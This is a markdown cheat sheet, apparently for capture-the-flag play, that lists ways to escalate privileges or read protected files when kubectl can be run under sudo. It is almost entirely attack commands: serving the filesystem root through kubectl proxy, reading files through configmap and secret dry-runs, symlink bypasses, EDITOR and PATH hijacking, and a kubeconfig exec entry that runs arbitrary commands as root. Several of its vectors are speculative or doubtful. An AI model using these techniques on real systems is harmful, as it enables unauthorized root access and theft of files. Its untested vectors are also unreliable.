# kubectl Privilege Escalation Cheat Sheet .. (not-great-beta-edition) ..

## File Serving Vectors
```bash
# Basic file server
sudo kubectl proxy --address=0.0.0.0 --port=PORT --www=PATH --www-prefix=/x/

# Bypass filters
sudo kubectl proxy --www=PATH --www-prefix=/x/ --disable-filter=true

# Serve filesystem root
sudo kubectl proxy --www=/ --www-prefix=/x/

# Access via: wget -qO- http://localhost:PORT/x/target/file
```

## File Reading Techniques
```bash
# ConfigMap creation (dry-run)
sudo kubectl create configmap test --from-file=TARGET --dry-run=client -o yaml

# Secret creation 
sudo kubectl create secret generic test --from-file=TARGET --dry-run=client -o yaml

# Apply with validation
sudo kubectl apply --validate=false --dry-run=client -f TARGET

# File conversion attempts
sudo kubectl convert -f TARGET
```

## Symlink Bypasses
```bash
# Create accessible symlinks
ln -sf /target/file /writable/location
# Access via proxy serving parent directory

# Directory symlinks
ln -sf /target/directory /accessible/path
```

## Environment Variable Abuse
```bash
# Editor hijacking
export EDITOR="command_here; original_editor"
sudo kubectl edit resource

export VISUAL="payload; editor"

# Path manipulation for plugins
echo '#!/bin/sh\npayload' > /tmp/kubectl-custom
chmod +x /tmp/kubectl-custom
PATH=/tmp:$PATH sudo kubectl custom
```

## Configuration Exploitation
```bash
# Malicious kubeconfig with exec
cat > config.yaml << 'EOF'
apiVersion: v1
kind: Config
users:
- name: user
  user:
    exec:
      command: /target/command
      args: ["arg1"]
      apiVersion: client.authentication.k8s.io/v1beta1
EOF

sudo kubectl --kubeconfig=config.yaml command
```

## Output Format Abuse
```bash
# Custom column files
sudo kubectl get -o custom-columns-file=TARGET pods

# Raw output attempts
sudo kubectl get --raw TARGET

# Template processing
sudo kubectl get -o go-template-file=TARGET resource
```

## File Discovery
```bash
# System enumeration
df  # May reveal restricted paths
find /writable -type l  # Find existing symlinks
ls -la /accessible/  # Directory traversal

# Proxy directory listing
wget -qO- http://localhost:PORT/prefix/path/
```

## Completion System
```bash
# Generate completion scripts
sudo kubectl completion bash > /tmp/comp
# May contain file references or can be modified

# Plugin enumeration  
sudo kubectl plugin list
```

## Error-Based Information Disclosure
```bash
# Invalid YAML parsing
echo 'apiVersion: /target/file' > invalid.yaml
sudo kubectl apply -f invalid.yaml

# Validation errors
sudo kubectl create --validate=true -f TARGET
```

## Network Bypass (if applicable)
```bash
# Local-only serving
sudo kubectl proxy --address=127.0.0.1 --port=PORT

# IPv6 binding
sudo kubectl proxy --address=::1 --port=PORT
```

## Common CTF File Locations
```
/flag*
/root/flag*
/home/user/flag*
/tmp/flag*
/var/tmp/flag*
/.flag*
/etc/flag*
```

## Debugging & Troubleshooting
```bash
# Version information
sudo kubectl version --client

# Configuration viewing
sudo kubectl config view

# Help system exploration
sudo kubectl COMMAND --help

# Process monitoring
ps aux | grep kubectl
netstat -tlpn | grep kubectl
```

